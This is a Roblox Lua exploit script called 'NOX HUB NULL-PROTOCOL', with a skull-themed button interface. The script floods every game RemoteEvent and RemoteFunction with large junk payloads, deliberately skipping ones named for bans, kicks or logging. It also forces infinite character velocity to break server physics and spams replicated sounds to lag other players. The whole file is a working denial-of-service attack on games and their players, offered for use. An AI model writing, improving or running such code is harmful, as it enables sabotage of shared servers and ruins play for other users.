--[[
    🔱 NOX HUB v24.0 [NULL-PROTOCOL] 🔱
    "Certain things are not meant to last. <3"
    
    NULL FEATURES:
    - [TRINITY ENGINE] : Attacks Network, Physics, AND Rendering simultaneously.
    - [PHYS-KILL] : Forces infinite velocity to break server physics engine.
    - [NET-KILL] : Uses v23's Adaptive Warheads for maximum packet stress.
    - [RENDER-KILL] : Spams replication to lag other players (GPU Stress).
]]

-- // CORE SERVICES //
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local CoreGui = game:GetService("CoreGui")
local UserInputService = game:GetService("UserInputService")
local Stats = game:GetService("Stats")
local LocalPlayer = Players.LocalPlayer

-- // 1. NULL ENGINE //
local Engine = {
    Active = false,
    Targets = {},
    Particles = {}
}

function Engine:Scan()
    Engine.Targets = {}
    for _, v in pairs(game:GetDescendants()) do
        if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
            local n = v.Name:lower()
            if not (n:find("ban") or n:find("kick") or n:find("log")) then
                 table.insert(Engine.Targets, v)
            end
        end
    end
end

function Engine:Engage()
    if Engine.Active then return end
    Engine.Active = true
    
    Engine:Scan()
    
    game:GetService("StarterGui"):SetCore("SendNotification", {Title="NULL", Text="PROTOCOL INITIATED."})
    
    -- A. NET-KILL (The Adaptive Warhead)
    task.spawn(function()
        local Payload = table.create(50, string.rep("💀", 1000)) -- Heavy String
        while Engine.Active do
            for _, t in ipairs(Engine.Targets) do
                pcall(function()
                    if t:IsA("RemoteEvent") then t:FireServer(Payload)
                    else task.spawn(function() t:InvokeServer(Payload) end) end
                end)
            end
            RunService.Heartbeat:Wait()
        end
    end)
    
    -- B. PHYS-KILL (Infinite Velocity)
    task.spawn(function()
        while Engine.Active do
            pcall(function()
                local char = LocalPlayer.Character
                if char and char:FindFirstChild("HumanoidRootPart") then
                    -- MATH.HUGE causes physics engine to panic trying to calculate next position
                    char.HumanoidRootPart.Velocity = Vector3.new(math.huge, math.huge, math.huge)
                    char.HumanoidRootPart.RotVelocity = Vector3.new(math.huge, math.huge, math.huge)
                    char.HumanoidRootPart.CFrame = CFrame.new(0, 1000000, 0) -- Teleport far to force chunk load
                end
            end)
            RunService.Stepped:Wait()
        end
    end)
    
    -- C. RENDER-KILL (Replication Lag)
    -- We spam "Sound" creation. Sounds replicate.
    task.spawn(function()
        while Engine.Active do
            for i = 1, 10 do
                local s = Instance.new("Sound", workspace)
                s.SoundId = "rbxassetid://0" -- Invalid ID forces error log spam on other clients
                s.Volume = 1
                s:Play()
                game:GetService("Debris"):AddItem(s, 0.1)
            end
            task.wait(0.1)
        end
    end)
end

function Engine:Stop()
    Engine.Active = false
    -- Reset Char
    LocalPlayer.Character:BreakJoints()
end

-- // 2. NULL UI //
local Nox = {}

function Nox:CreateUI()
    for _, v in pairs(CoreGui:GetChildren()) do if v.Name:find("Nox") then v:Destroy() end end
    
    local Screen = Instance.new("ScreenGui")
    Screen.Name = "NoxNull"
    pcall(function() Screen.Parent = CoreGui end)
    
    local Main = Instance.new("Frame", Screen)
    Main.Size = UDim2.new(0, 300, 0, 400)
    Main.Position = UDim2.new(0.5, -150, 0.5, -200)
    Main.BackgroundColor3 = Color3.fromRGB(15, 0, 0) -- Blood Red/Black
    Main.BorderSizePixel = 0
    
    local Stroke = Instance.new("UIStroke", Main)
    Stroke.Color = Color3.fromRGB(150, 0, 0)
    Stroke.Thickness = 2
    
    -- LOGO
    local Skull = Instance.new("ImageLabel", Main)
    Skull.Size = UDim2.new(0, 150, 0, 150)
    Skull.Position = UDim2.new(0.5, -75, 0.1, 0)
    Skull.Image = "rbxassetid://497047509" -- Skull ID
    Skull.ImageColor3 = Color3.fromRGB(200, 0, 0)
    Skull.BackgroundTransparency = 1
    
    -- TITLE
    local Title = Instance.new("TextLabel", Main)
    Title.Text = "NULL PROTOCOL"
    Title.Font = Enum.Font.Creepster -- Scary font
    Title.TextColor3 = Color3.fromRGB(255, 0, 0)
    Title.TextSize = 30
    Title.Size = UDim2.new(1, 0, 0, 50)
    Title.Position = UDim2.new(0, 0, 0.5, 0)
    Title.BackgroundTransparency = 1
    
    -- STATUS
    local Status = Instance.new("TextLabel", Main)
    Status.Text = "WAITING..."
    Status.Size = UDim2.new(1, 0, 0, 20)
    Status.Position = UDim2.new(0, 0, 0.65, 0)
    Status.TextColor3 = Color3.fromRGB(100, 50, 50)
    Status.Font = Enum.Font.Code
    Status.BackgroundTransparency = 1
    
    -- BUTTON
    local Btn = Instance.new("TextButton", Main)
    Btn.Size = UDim2.new(0.8, 0, 0.2, 0)
    Btn.Position = UDim2.new(0.1, 0, 0.75, 0)
    Btn.BackgroundColor3 = Color3.fromRGB(50, 0, 0)
    Btn.Text = "EXECUTE"
    Btn.TextColor3 = Color3.fromRGB(200, 0, 0)
    Btn.Font = Enum.Font.Creepster
    Btn.TextSize = 24
    
    local BCorner = Instance.new("UICorner", Btn)
    BCorner.CornerRadius = UDim.new(0, 4)
    
    local Pulsing = false
    Btn.MouseButton1Click:Connect(function()
        if not Engine.Active then
            Engine:Engage()
            Btn.Text = "TERMINATE"
            Status.Text = "TRINITY ENGINE: ACTIVE"
            Pulsing = true
            task.spawn(function()
                while Pulsing do
                    game:GetService("TweenService"):Create(Skull, TweenInfo.new(0.5), {ImageColor3 = Color3.fromRGB(255, 0, 0)}):Play()
                    wait(0.5)
                    game:GetService("TweenService"):Create(Skull, TweenInfo.new(0.5), {ImageColor3 = Color3.fromRGB(100, 0, 0)}):Play()
                    wait(0.5)
                end
            end)
        else
            Engine:Stop()
            Pulsing = false
            Btn.Text = "EXECUTE"
            Status.Text = "WAITING..."
            Skull.ImageColor3 = Color3.fromRGB(200, 0, 0)
        end
    end)
    
    -- DRAG UI
    local dragging, dragInput, dragStart, startPos
    Main.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            dragging = true; dragStart = input.Position; startPos = Main.Position
        end
    end)
    UserInputService.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseMovement and dragging then
            local delta = input.Position - dragStart
            Main.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
        end
    end)
    UserInputService.InputEnded:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseButton1 then dragging = false end end)
end

Nox:CreateUI()
